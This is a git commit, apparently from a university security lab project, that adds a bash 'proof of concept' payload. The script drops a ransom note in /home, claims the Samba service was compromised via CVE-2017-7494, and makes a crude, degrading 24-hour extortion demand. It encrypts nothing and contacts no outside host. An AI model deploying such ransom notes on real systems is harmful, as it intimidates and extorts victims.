c500ca1e8f1699145fffa5b254b6bb18f0d1ce58
FelipeR-UFBA <feliperosario@ufba.br>
2025-11-09 17:42:49 -0300

    Terceiro cenário + payload

---
+++ payload.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+# Prova de conceito.
+# Ele cria uma nota de resgate no diretório /home.
+
+echo "------------------------------------" > /home/RESGATE.txt
+echo "OLA, O SEU SISTEMA FOI COMPROMETIDO!" >> /home/RESGATE.txt
+echo "" >> /home/RESGATE.txt
+echo "NÃO GRITA" >> /home/RESGATE.txt
+echo "O seu serviço Samba estava vulnerável ao CVE-2017-7494, você vai precisar comer merda na frente da webcam pra recuperar seus arquivos. Tem 24H!" >> /home/RESGATE.txt
+echo "------------------------------------"
+
+# Pra ter a certeza que o ficheiro é visível
+chmod 777 /home/RESGATE.txt
